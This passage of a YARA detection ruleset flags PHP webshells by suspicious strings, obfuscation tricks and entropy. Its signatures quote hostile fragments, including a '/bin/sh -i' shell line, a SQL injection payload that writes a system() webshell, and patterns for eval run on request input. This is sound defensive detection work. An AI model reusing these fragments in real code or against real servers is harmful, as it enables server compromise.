        $gen_much_sus14 = "\\pcAnywhere\\" nocase
        $gen_much_sus15 = "antivirus" nocase
        $gen_much_sus16 = "McAfee" nocase
        $gen_much_sus17 = "nishang"
        $gen_much_sus18 = "\"unsafe" fullword wide ascii
        $gen_much_sus19 = "'unsafe" fullword wide ascii
        $gen_much_sus24 = "exploit" fullword wide ascii
        $gen_much_sus25 = "Exploit" fullword wide ascii
        $gen_much_sus26 = "TVqQAAMAAA" wide ascii
        $gen_much_sus30 = "Hacker" wide ascii
        $gen_much_sus31 = "HACKED" fullword wide ascii
        $gen_much_sus32 = "hacked" fullword wide ascii
        $gen_much_sus33 = "hacker" wide ascii
        $gen_much_sus34 = "grayhat" nocase wide ascii
        $gen_much_sus35 = "Microsoft FrontPage" wide ascii
        $gen_much_sus36 = "Rootkit" wide ascii
        $gen_much_sus37 = "rootkit" wide ascii
        $gen_much_sus38 = "/*-/*-*/" wide ascii
        $gen_much_sus39 = "u\"+\"n\"+\"s" wide ascii
        $gen_much_sus40 = "\"e\"+\"v" wide ascii
        $gen_much_sus41 = "a\"+\"l\"" wide ascii
        $gen_much_sus42 = "\"+\"(\"+\"" wide ascii
        $gen_much_sus43 = "q\"+\"u\"" wide ascii
        $gen_much_sus44 = "\"u\"+\"e" wide ascii
        $gen_much_sus45 = "/*//*/" wide ascii
        $gen_much_sus46 = "(\"/*/\"" wide ascii
        $gen_much_sus47 = "eval(eval(" wide ascii
        // self remove
        $gen_much_sus48 = "unlink(__FILE__)" wide ascii
        $gen_much_sus49 = "Shell.Users" wide ascii
        $gen_much_sus50 = "PasswordType=Regular" wide ascii
        $gen_much_sus51 = "-Expire=0" wide ascii
        $gen_much_sus60 = "_=$$_" wide ascii
        $gen_much_sus61 = "_=$$_" wide ascii
        $gen_much_sus62 = "++;$" wide ascii
        $gen_much_sus63 = "++; $" wide ascii
        $gen_much_sus64 = "_.=$_" wide ascii
        $gen_much_sus70 = "-perm -04000" wide ascii
        $gen_much_sus71 = "-perm -02000" wide ascii
        $gen_much_sus72 = "grep -li password" wide ascii
        $gen_much_sus73 = "-name config.inc.php" wide ascii
        // touch without parameters sets the time to now, not malicious and gives fp
        $gen_much_sus75 = "password crack" wide ascii
        $gen_much_sus76 = "mysqlDll.dll" wide ascii
        $gen_much_sus77 = "net user" wide ascii
        $gen_much_sus80 = "fopen(\".htaccess\",\"w" wide ascii
        $gen_much_sus81 = /strrev\(['"]/ wide ascii
        $gen_much_sus82 = "PHPShell" fullword wide ascii
        $gen_much_sus821= "PHP Shell" fullword wide ascii
        $gen_much_sus83 = "phpshell" fullword wide ascii
        $gen_much_sus84 = "PHPshell" fullword wide ascii
        $gen_much_sus87 = "deface" wide ascii
        $gen_much_sus88 = "Deface" wide ascii
        $gen_much_sus89 = "backdoor" wide ascii
        $gen_much_sus90 = "r00t" fullword wide ascii
        $gen_much_sus91 = "xp_cmdshell" fullword wide ascii
        $gen_much_sus92 = "DEFACE" fullword wide ascii
        $gen_much_sus93 = "Bypass" fullword wide ascii
        $gen_much_sus94 = /eval\s{2,20}\(/ nocase wide ascii
        $gen_much_sus100 = "rot13" wide ascii
        $gen_much_sus101 = "ini_set('error_log'" wide ascii
        $gen_much_sus102 = "base64_decode(base64_decode(" wide ascii
        $gen_much_sus103 = "=$_COOKIE;" wide ascii
        // {1}.$ .. |{9}.$
        $gen_much_sus104 = { C0 A6 7B 3? 7D 2E 24 }
        $gen_much_sus105 = "$GLOBALS[\"__" wide ascii
        // those calculations don't make really sense :)
        $gen_much_sus106 = ")-0)" wide ascii
        $gen_much_sus107 = "-0)+" wide ascii
        $gen_much_sus108 = "+0)+" wide ascii
        $gen_much_sus109 = "+(0/" wide ascii
        $gen_much_sus110 = "+(0+" wide ascii
        $gen_much_sus111 = "extract($_REQUEST)" wide ascii
        $gen_much_sus112 = "<?php\t\t\t\t\t\t\t\t\t\t\t" wide ascii
        $gen_much_sus113 = "\t\t\t\t\t\t\t\t\t\t\textract" wide ascii
        $gen_much_sus114 = "\" .\"" wide ascii
        $gen_much_sus115 = "end($_POST" wide ascii

        $weevely1 = /';\n\$\w\s?=\s?'/ wide ascii
        $weevely2 = /';\x0d\n\$\w\s?=\s?'/ wide ascii // same with \r\n
        $weevely3 = /';\$\w{1,2}='/ wide ascii
        $weevely4 = "str_replace" fullword wide ascii

        $gif = { 47 49 46 38 }

        $fp1 = "# Some examples from obfuscated malware:" ascii
        $fp2 = "* @package   PHP_CodeSniffer" ascii
        $fp3 = ".jQuery===" ascii
        $fp4 = "* @param string $lstat encoded LStat string" ascii
    condition:
        //any of them or
        not (
            uint16(0) == 0x5a4d or
            // <?xml
            uint32be(0) == 0x3c3f786d  or
            // <?XML
            uint32be(0) == 0x3c3f584d  or
            $dex at 0 or
            $pack at 0 or
            // fp on jar with zero compression
            uint16(0) == 0x4b50 or
            1 of ($fp*)
        )
        and (
            any of ( $new_php* ) or
            $php_short at 0
        )
        and (
            any of ( $dynamic* )
        )
        and
            (
            $gif at 0 or
        (
            (
                filesize < 1KB and
                (
                    1 of ( $gen_much_sus* )
                )
            ) or (
                filesize < 2KB and
                (
                    ( #weevely1 + #weevely2 + #weevely3 ) > 2 and
                    #weevely4 > 1
                )
            ) or (
                filesize < 4000 and
                (
                    1 of ( $gen_much_sus* ) or
                    2 of ( $gen_bit_sus* )
                )
            ) or (
                filesize < 20KB and
                (
                    2 of ( $gen_much_sus* ) or
                    4 of ( $gen_bit_sus* )
                )
            ) or (
                filesize < 50KB and
                (
                    3 of ( $gen_much_sus* ) or
                    5 of ( $gen_bit_sus* )
                )
            ) or (
                filesize < 100KB and
                (
                    3 of ( $gen_much_sus* ) or
                    6 of ( $gen_bit_sus* )
                )
            ) or (
                filesize < 160KB and
                (
                    3 of ( $gen_much_sus* ) or
                    7 of ( $gen_bit_sus* ) or
                    (
                        // php files which use strings in the full ascii8 spectrum have a much hioher deviation than normal php-code
                        // e.g. 4057005718bb18b51b02d8b807265f8df821157ac47f78ace77f21b21fc77232
                        math.deviation(500, filesize-500, 89.0) > 70
                        // uncomment and include an "and" above for debugging, also import on top of file. needs yara 4.2.0
                        //console.log("high deviation") and
                        //console.log(math.deviation(500, filesize-500, 89.0))
                    )
                    // TODO: requires yara 4.2.0 so wait a bit until that's more common
                    //or
                    //(
                        // big file and just one line = minified
                        //filesize > 10KB and
                        //math.count(0x0A) < 2
                    //)
                )
            ) or (
                filesize < 500KB and
                (
                    4 of ( $gen_much_sus* ) or
                    8 of ( $gen_bit_sus* ) or
                    #gen_much_sus104 > 4

                )
            )
        ) or (
            // file shouldn't be too small to have big enough data for math.entropy
            filesize > 2KB and filesize < 1MB and
            (
                (
                    // base64 :
                    // ignore first and last 500bytes because they usually contain code for decoding and executing
                    math.entropy(500, filesize-500) >= 5.7 and
                    // encoded text has a higher mean than text or code because it's missing the spaces and special chars with the low numbers
                    math.mean(500, filesize-500) > 80 and
                    // deviation of base64 is ~20 according to CyberChef_v9.21.0.html#recipe=Generate_Lorem_Ipsum(3,'Paragraphs')To_Base64('A-Za-z0-9%2B/%3D')To_Charcode('Space',10)Standard_Deviation('Space')
                    // lets take a bit more because it might not be pure base64 also include some xor, shift, replacement, ...
                    // 89 is the mean of the base64 chars
                    math.deviation(500, filesize-500, 89.0) < 23
                ) or (
                    // gzinflated binary sometimes used in php webshells
                    // ignore first and last 500bytes because they usually contain code for decoding and executing
                    math.entropy(500, filesize-500) >= 7.7 and
                    // encoded text has a higher mean than text or code because it's missing the spaces and special chars with the low numbers
                    math.mean(500, filesize-500) > 120 and
                    math.mean(500, filesize-500) < 136 and
                    // deviation of base64 is ~20 according to CyberChef_v9.21.0.html#recipe=Generate_Lorem_Ipsum(3,'Paragraphs')To_Base64('A-Za-z0-9%2B/%3D')To_Charcode('Space',10)Standard_Deviation('Space')
                    // lets take a bit more because it might not be pure base64 also include some xor, shift, replacement, ...
                    // 89 is the mean of the base64 chars
                    math.deviation(500, filesize-500, 89.0) > 65
                )
            )
        )
        )
}

rule WEBSHELL_PHP_Encoded_Big
{
    meta:
        description = "PHP webshell using some kind of eval with encoded blob to decode"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        date = "2021/02/07"
        modified = "2023-07-05"
        score = 50
        hash = "1d4b374d284c12db881ba42ee63ebce2759e0b14"
        hash = "fc0086caee0a2cd20609a05a6253e23b5e3245b8"
        hash = "b15b073801067429a93e116af1147a21b928b215"
        hash = "74c92f29cf15de34b8866db4b40748243fb938b4"
        hash = "042245ee0c54996608ff8f442c8bafb8"

        id = "c3bb7b8b-c554-5802-8955-c83722498f8b"
    strings:

        //strings from private rule capa_php_new
        $new_php1 = /<\?=[\w\s@$]/ wide ascii
        $new_php2 = "<?php" nocase wide ascii
        $new_php3 = "<script language=\"php" nocase wide ascii
        $php_short = "<?"

        //strings from private rule capa_php_payload
        // \([^)] to avoid matching on e.g. eval() in comments
        $cpayload1 = /\beval[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload2 = /\bexec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload3 = /\bshell_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload4 = /\bpassthru[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload5 = /\bsystem[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload6 = /\bpopen[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload7 = /\bproc_open[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload8 = /\bpcntl_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload9 = /\bassert[\n\t ]{0,500}\([^)0]/ nocase wide ascii
        $cpayload10 = /\bpreg_replace[\n\t ]{0,500}(\(.{1,|\/\*)100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase wide ascii
        $cpayload12 = /\bmb_ereg_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
        $cpayload13 = /\bmb_eregi_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
        $cpayload20 = /\bcreate_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload21 = /\bReflectionFunction[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
        $cpayload22 = /fetchall\(PDO::FETCH_FUNC[\n\t ]{0,500}[,}\)]/ nocase wide ascii

        $m_cpayload_preg_filter1 = /\bpreg_filter[\n\t ]{0,500}(\([^\)]|\/\*)/ nocase wide ascii
        $m_cpayload_preg_filter2 = "'|.*|e'" nocase wide ascii
        // TODO backticks

    condition:
        //console.log(math.entropy(500, filesize-500)) and
        //console.log(math.mean(500, filesize-500)) and
        //console.log(math.deviation(500, filesize-500, 89.0)) and
        //any of them or
        filesize < 1000KB and (
            any of ( $new_php* ) or
        $php_short at 0
        )
        and (
            any of ( $cpayload* ) or
        all of ( $m_cpayload_preg_filter* )
        )
        and (
            // file shouldn't be too small to have big enough data for math.entropy
            filesize > 2KB and
        (
            // base64 :
            // ignore first and last 500bytes because they usually contain code for decoding and executing
            math.entropy(500, filesize-500) >= 5.7 and
            // encoded text has a higher mean than text or code because it's missing the spaces and special chars with the low numbers
            math.mean(500, filesize-500) > 80 and
            // deviation of base64 is ~20 according to CyberChef_v9.21.0.html#recipe=Generate_Lorem_Ipsum(3,'Paragraphs')To_Base64('A-Za-z0-9%2B/%3D')To_Charcode('Space',10)Standard_Deviation('Space')
            // lets take a bit more because it might not be pure base64 also include some xor, shift, replacement, ...
            // 89 is the mean of the base64 chars
            math.deviation(500, filesize-500, 89.0) < 24
        ) or (
            // gzinflated binary sometimes used in php webshells
            // ignore first and last 500bytes because they usually contain code for decoding and executing
            math.entropy(500, filesize-500) >= 7.7 and
            // encoded text has a higher mean than text or code because it's missing the spaces and special chars with the low numbers
            math.mean(500, filesize-500) > 120 and
            math.mean(500, filesize-500) < 136 and
            // deviation of base64 is ~20 according to CyberChef_v9.21.0.html#recipe=Generate_Lorem_Ipsum(3,'Paragraphs')To_Base64('A-Za-z0-9%2B/%3D')To_Charcode('Space',10)Standard_Deviation('Space')
            // lets take a bit more because it might not be pure base64 also include some xor, shift, replacement, ...
            // 89 is the mean of the base64 chars
            math.deviation(500, filesize-500, 89.0) > 65
        )
        )

}

rule WEBSHELL_PHP_Generic_Backticks
{
    meta:
        description = "Generic PHP webshell which uses backticks directly on user input"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/07"
        modified = "2023-04-05"
        hash = "339f32c883f6175233f0d1a30510caa52fdcaa37"
        hash = "8db86ad90883cd208cf86acd45e67c03f994998804441705d690cb6526614d00"
        hash = "af987b0eade03672c30c095cee0c7c00b663e4b3c6782615fb7e430e4a7d1d75"
        hash = "67339f9e70a17af16cf51686918cbe1c0604e129950129f67fe445eaff4b4b82"
        hash = "144e242a9b219c5570973ca26d03e82e9fbe7ba2773305d1713288ae3540b4ad"
        hash = "8db86ad90883cd208cf86acd45e67c03f994998804441705d690cb6526614d00"

        id = "b2f1d8d0-8668-5641-8ce9-c8dd71f51f58"
    strings:
        $backtick = /`\s*{?\$(_POST\[|_GET\[|_REQUEST\[|_SERVER\['HTTP_)/ wide ascii

        //strings from private rule capa_php_old_safe
        $php_short = "<?" wide ascii
        // prevent xml and asp from hitting with the short tag
        $no_xml1 = "<?xml version" nocase wide ascii
        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
        $no_pdf = "<?xpacket"

        // of course the new tags should also match
        // already matched by "<?"
        $php_new1 = /<\?=[^?]/ wide ascii
        $php_new2 = "<?php" nocase wide ascii
        $php_new3 = "<script language=\"php" nocase wide ascii

    condition:
        (
            (
                (
                        $php_short in (0..100) or
                        $php_short in (filesize-1000..filesize)
                )
                and not any of ( $no_* )
            )
            or any of ( $php_new* )
        )
        and $backtick and filesize < 200
}

rule WEBSHELL_PHP_Generic_Backticks_OBFUSC
{
    meta:
        description = "Generic PHP webshell which uses backticks directly on user input"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/07"
        modified = "2023-04-05"
        hash = "23dc299f941d98c72bd48659cdb4673f5ba93697"
        hash = "e3f393a1530a2824125ecdd6ac79d80cfb18fffb89f470d687323fb5dff0eec1"
        hash = "1e75914336b1013cc30b24d76569542447833416516af0d237c599f95b593f9b"
        hash = "8db86ad90883cd208cf86acd45e67c03f994998804441705d690cb6526614d00"

        id = "5ecb329f-0755-536d-8bfa-e36158474a0b"
    strings:
        $s1 = /echo[\t ]{0,500}\(?`\$/ wide ascii

        //strings from private rule capa_php_old_safe
        $php_short = "<?" wide ascii
        // prevent xml and asp from hitting with the short tag
        $no_xml1 = "<?xml version" nocase wide ascii
        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
        $no_pdf = "<?xpacket"

        // of course the new tags should also match
        // already matched by "<?"
        $php_new1 = /<\?=[^?]/ wide ascii
        $php_new2 = "<?php" nocase wide ascii
        $php_new3 = "<script language=\"php" nocase wide ascii

    condition:
        filesize < 500 and (
            (
                (
                        $php_short in (0..100) or
                        $php_short in (filesize-1000..filesize)
                )
                and not any of ( $no_* )
            )
            or any of ( $php_new* )
        )
        and $s1
}

rule WEBSHELL_PHP_By_String_Known_Webshell
{
    meta:
        description = "Known PHP Webshells which contain unique strings, lousy rule for low hanging fruits. Most are catched by other rules in here but maybe these catch different versions."
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        date = "2021-01-09"
        modified = "2023-04-05"
        score = 70
        hash = "d889da22893536d5965541c30896f4ed4fdf461d"
        hash = "10f4988a191774a2c6b85604344535ee610b844c1708602a355cf7e9c12c3605"
        hash = "7b6471774d14510cf6fa312a496eed72b614f6fc"
        hash = "decda94d40c3fd13dab21e197c8d05f48020fa498f4d0af1f60e29616009e9bf"
        hash = "ef178d332a4780e8b6db0e772aded71ac1a6ed09b923cc359ba3c4efdd818acc"
        hash = "a7a937c766029456050b22fa4218b1f2b45eef0db59b414f79d10791feca2c0b"
        hash = "e7edd380a1a2828929fbde8e7833d6e3385f7652ea6b352d26b86a1e39130ee8"
        hash = "0038946739956c80d75fa9eeb1b5c123b064bbb9381d164d812d72c7c5d13cac"
        hash = "3a7309bad8a5364958081042b5602d82554b97eca04ee8fdd8b671b5d1ddb65d"
        hash = "a78324b9dc0b0676431af40e11bd4e26721a960c55e272d718932bdbb755a098"
        hash = "a27f8cd10cedd20bff51e9a8e19e69361cc8a6a1a700cc64140e66d160be1781"
        hash = "9bbd3462993988f9865262653b35b4151386ed2373592a1e2f8cf0f0271cdb00"
        hash = "459ed1d6f87530910361b1e6065c05ef0b337d128f446253b4e29ae8cc1a3915"
        hash = "12b34d2562518d339ed405fb2f182f95dce36d08fefb5fb67cc9386565f592d1"
        hash = "96d8ca3d269e98a330bdb7583cccdc85eab3682f9b64f98e4f42e55103a71636"
        hash = "312ee17ec9bed4278579443b805c0eb75283f54483d12f9add7d7d9e5f9f6105"
        hash = "15c4e5225ff7811e43506f0e123daee869a8292fc8a38030d165cc3f6a488c95"
        hash = "0c845a031e06925c22667e101a858131bbeb681d78b5dbf446fdd5bca344d765"
        hash = "d52128bcfff5e9a121eab3d76382420c3eebbdb33cd0879fbef7c3426e819695"

        //TODO regex for 96d8ca3d269e98a330bdb7583cccdc85eab3682f9b64f98e4f42e55103a71636 would it be fast enough?

        id = "05ac0e0a-3a19-5c60-b89a-4a300d8c22e7"
    strings:
        $pbs1 = "b374k shell" wide ascii
        $pbs2 = "b374k/b374k" wide ascii
        $pbs3 = "\"b374k" wide ascii
        $pbs4 = "$b374k(\"" wide ascii
        $pbs5 = "b374k " wide ascii
        $pbs6 = "0de664ecd2be02cdd54234a0d1229b43" wide ascii
        $pbs7 = "pwnshell" wide ascii
        $pbs8 = "reGeorg" fullword wide ascii
        $pbs9 = "Georg says, 'All seems fine" fullword wide ascii
        $pbs10 = "My PHP Shell - A very simple web shell" wide ascii
        $pbs11 = "<title>My PHP Shell <?echo VERSION" wide ascii
        $pbs12 = "F4ckTeam" fullword wide ascii
        $pbs15 = "MulCiShell" fullword wide ascii
        // crawler avoid string
        $pbs30 = "bot|spider|crawler|slurp|teoma|archive|track|snoopy|java|lwp|wget|curl|client|python|libwww" wide ascii
        // <?=($pbs_=@$_GET[2]).@$_($_GET[1])?>
        $pbs35 = /@\$_GET\s?\[\d\]\)\.@\$_\(\$_GET\s?\[\d\]\)/ wide ascii
        $pbs36 = /@\$_GET\s?\[\d\]\)\.@\$_\(\$_POST\s?\[\d\]\)/ wide ascii
        $pbs37 = /@\$_POST\s?\[\d\]\)\.@\$_\(\$_GET\s?\[\d\]\)/ wide ascii
        $pbs38 = /@\$_POST\[\d\]\)\.@\$_\(\$_POST\[\d\]\)/ wide ascii
        $pbs39 = /@\$_REQUEST\[\d\]\)\.@\$_\(\$_REQUEST\[\d\]\)/ wide ascii
        $pbs42 = "array(\"find config.inc.php files\", \"find / -type f -name config.inc.php\")" wide ascii
        $pbs43 = "$_SERVER[\"\\x48\\x54\\x54\\x50" wide ascii
        $pbs52 = "preg_replace(\"/[checksql]/e\""
        $pbs53 = "='http://www.zjjv.com'"
        $pbs54 = "=\"http://www.zjjv.com\""

        $pbs60 = /setting\["AccountType"\]\s?=\s?3/
        $pbs61 = "~+d()\"^\"!{+{}"
        $pbs62 = "use function \\eval as "
        $pbs63 = "use function \\assert as "
        $pbs64 = "eval(`/*" wide ascii
        $pbs65 = "/* Reverse engineering of this file is strictly prohibited. File protected by copyright law and provided under license. */" wide ascii
        $pbs66 = "Tas9er" fullword wide ascii
        $pbs67 = "\"TSOP_\";" fullword wide ascii // reverse _POST
        $pbs68 = "str_rot13('nffreg')" wide ascii // rot13(assert)
        $pbs69 = "<?=`{$'" wide ascii
        $pbs70 = "{'_'.$_}[\"_\"](${'_'.$_}[\"_" wide ascii
        $pbs71 = "\"e45e329feb5d925b\"" wide ascii
        $pbs72 = "| PHP FILE MANAGER" wide ascii
        $pbs73 = "\neval(htmlspecialchars_decode(gzinflate(base64_decode($" wide ascii
        $pbs74 = "/*\n\nShellindir.org\n\n*/" wide ascii
        $pbs75 = "$shell = 'uname -a; w; id; /bin/sh -i';" wide ascii
        $pbs76 = "'password' . '/' . 'id' . '/' . " wide ascii
        $pbs77 = "= create_function /*" wide ascii
        $pbs78 = "W3LL M!N! SH3LL" wide ascii
        $pbs79 = "extract($_REQUEST)&&@$" wide ascii
        $pbs80 = "\"P-h-p-S-p-y\"" wide ascii
        $pbs81 = "\\x5f\\x72\\x6f\\x74\\x31\\x33" wide ascii
        $pbs82 = "\\x62\\x61\\x73\\x65\\x36\\x34\\x5f" wide ascii
        $pbs83 = "*/base64_decode/*" wide ascii
        $pbs84 = "\n@eval/*" wide ascii
        $pbs85 = "*/eval/*" wide ascii
        $pbs86 = "*/ array /*" wide ascii
        $pbs87 = "2jtffszJe" wide ascii
        $pbs88 = "edocne_46esab" wide ascii
        $pbs89 = "eval($_HEADERS" wide ascii
        $pbs90 = ">Infinity-Sh3ll<" ascii

        $front1 = "<?php eval(" nocase wide ascii

        //strings from private rule capa_php_old_safe
        $php_short = "<?" wide ascii
        // prevent xml and asp from hitting with the short tag
        $no_xml1 = "<?xml version" nocase wide ascii
        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
        $no_pdf = "<?xpacket"

        // of course the new tags should also match
        // already matched by "<?"
        $php_new1 = /<\?=[^?]/ wide ascii
        $php_new2 = "<?php" nocase wide ascii
        $php_new3 = "<script language=\"php" nocase wide ascii

        //strings from private rule capa_bin_files
        $dex   = { 64 65 ( 78 | 79 ) 0a 30 }
        $pack  = { 50 41 43 4b 00 00 00 02 00 }

    condition:
        filesize < 1000KB and (
            (
                (
                        $php_short in (0..100) or
                        $php_short in (filesize-1000..filesize)
                )
                and not any of ( $no_* )
            )
            or any of ( $php_new* )
        )
        and not (
        uint16(0) == 0x5a4d or
        $dex at 0 or
        $pack at 0 or
        // fp on jar with zero compression
        uint16(0) == 0x4b50
        )
        and
        ( any of ( $pbs* ) or $front1 in ( 0 .. 60 ) )
}

rule WEBSHELL_PHP_Strings_SUSP
{
    meta:
        description = "typical webshell strings, suspicious"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        date = "2021/01/12"
        modified = "2023-07-05"
        score = 50
        hash = "0dd568dbe946b5aa4e1d33eab1decbd71903ea04"
        hash = "dde2bdcde95730510b22ae8d52e4344997cb1e74"
        hash = "499db4d70955f7d40cf5cbaf2ecaf7a2"
        hash = "281b66f62db5caab2a6eb08929575ad95628a690"
        hash = "1ab3ae4d613b120f9681f6aa8933d66fa38e4886"

        id = "25f25df5-4398-562b-9383-e01ccb17e8de"
    strings:
        $sstring1 = "eval(\"?>\"" nocase wide ascii

        //strings from private rule capa_php_old_safe
        $php_short = "<?" wide ascii
        // prevent xml and asp from hitting with the short tag
        $no_xml1 = "<?xml version" nocase wide ascii
        $no_xml2 = "<?xml-stylesheet" nocase wide ascii
        $no_asp1 = "<%@LANGUAGE" nocase wide ascii
        $no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
        $no_pdf = "<?xpacket"

        // of course the new tags should also match
        // already matched by "<?"
        $php_new1 = /<\?=[^?]/ wide ascii
        $php_new2 = "<?php" nocase wide ascii
        $php_new3 = "<script language=\"php" nocase wide ascii

        //strings from private rule php_false_positive
        // try to use only strings which would be flagged by themselves as suspicious by other rules, e.g. eval
        // a good choice is a string with good atom quality = ideally 4 unusual characters next to each other
        $gfp1  = "eval(\"return [$serialised_parameter" // elgg
        $gfp2  = "$this->assert(strpos($styles, $"
        $gfp3  = "$module = new $_GET['module']($_GET['scope']);"
        $gfp4  = "$plugin->$_POST['action']($_POST['id']);"
        $gfp5  = "$_POST[partition_by]($_POST["
        $gfp6  = "$object = new $_REQUEST['type']($_REQUEST['id']);"
        $gfp7  = "The above example code can be easily exploited by passing in a string such as" // ... ;)
        $gfp8  = "Smarty_Internal_Debug::start_render($_template);"
        $gfp9  = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
        $gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
        $gfp11 = "(eval (getenv \"EPROLOG\")))"
        $gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"

        //strings from private rule capa_php_input
        $inp1 = "php://input" wide ascii
        $inp2 = /_GET\s?\[/ wide ascii
        // for passing $_GET to a function
        $inp3 = /\(\s?\$_GET\s?\)/ wide ascii
        $inp4 = /_POST\s?\[/ wide ascii
        $inp5 = /\(\s?\$_POST\s?\)/ wide ascii
        $inp6 = /_REQUEST\s?\[/ wide ascii
        $inp7 = /\(\s?\$_REQUEST\s?\)/ wide ascii
        // PHP automatically adds all the request headers into the $_SERVER global array, prefixing each header name by the "HTTP_" string, so e.g. @eval($_SERVER['HTTP_CMD']) will run any code in the HTTP header CMD
        $inp15 = "_SERVER['HTTP_" wide ascii
        $inp16 = "_SERVER[\"HTTP_" wide ascii
        $inp17 = /getenv[\t ]{0,20}\([\t ]{0,20}['"]HTTP_/ wide ascii
        $inp18 = "array_values($_SERVER)" wide ascii
        $inp19 = /file_get_contents\("https?:\/\// wide ascii

    condition:
        filesize < 700KB and (
            (
                (
                        $php_short in (0..100) or
                        $php_short in (filesize-1000..filesize)
                )
                and not any of ( $no_* )
            )
            or any of ( $php_new* )
        )
        and not (
            any of ( $gfp* )
        )
        and
        ( 1 of ( $sstring* ) and (
            any of ( $inp* )
        )
        )
}

rule WEBSHELL_PHP_In_Htaccess
{
    meta:
        description = "Use Apache .htaccess to execute php code inside .htaccess"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/07"
        modified = "2023-07-05"
        hash = "c026d4512a32d93899d486c6f11d1e13b058a713"
        hash = "d79e9b13a32a9e9f3fa36aa1a4baf444bfd2599a"
        hash = "e1d1091fee6026829e037b2c70c228344955c263"
        hash = "c026d4512a32d93899d486c6f11d1e13b058a713"
        hash = "8c9e65cd3ef093cd9c5b418dc5116845aa6602bc92b9b5991b27344d8b3f7ef2"

        id = "0f5edff9-22b2-50c9-ae81-72698ea8e7db"
    strings:
        $hta = "AddType application/x-httpd-php .htaccess" wide ascii

    condition:
        filesize <100KB and $hta
}

rule WEBSHELL_PHP_Function_Via_Get
{
    meta:
        description = "Webshell which sends eval/assert via GET"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        date = "2021/01/09"
        modified = "2023-04-05"
        hash = "ce739d65c31b3c7ea94357a38f7bd0dc264da052d4fd93a1eabb257f6e3a97a6"
        hash = "d870e971511ea3e082662f8e6ec22e8a8443ca79"
        hash = "73fa97372b3bb829835270a5e20259163ecc3fdbf73ef2a99cb80709ea4572be"

        id = "5fef1063-2f9f-516e-86f6-cfd98bb05e6e"
    strings:
        $sr0 = /\$_GET\s?\[.{1,30}\]\(\$_GET\s?\[/ wide ascii
        $sr1 = /\$_POST\s?\[.{1,30}\]\(\$_GET\s?\[/ wide ascii
        $sr2 = /\$_POST\s?\[.{1,30}\]\(\$_POST\s?\[/ wide ascii
        $sr3 = /\$_GET\s?\[.{1,30}\]\(\$_POST\s?\[/ wide ascii
        $sr4 = /\$_REQUEST\s?\[.{1,30}\]\(\$_REQUEST\s?\[/ wide ascii
        $sr5 = /\$_SERVER\s?\[HTTP_.{1,30}\]\(\$_SERVER\s?\[HTTP_/ wide ascii

        //strings from private rule php_false_positive
        // try to use only strings which would be flagged by themselves as suspicious by other rules, e.g. eval
        // a good choice is a string with good atom quality = ideally 4 unusual characters next to each other
        $gfp1  = "eval(\"return [$serialised_parameter" // elgg
        $gfp2  = "$this->assert(strpos($styles, $"
        $gfp3  = "$module = new $_GET['module']($_GET['scope']);"
        $gfp4  = "$plugin->$_POST['action']($_POST['id']);"
        $gfp5  = "$_POST[partition_by]($_POST["
        $gfp6  = "$object = new $_REQUEST['type']($_REQUEST['id']);"
        $gfp7  = "The above example code can be easily exploited by passing in a string such as" // ... ;)
        $gfp8  = "Smarty_Internal_Debug::start_render($_template);"
        $gfp9  = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
        $gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
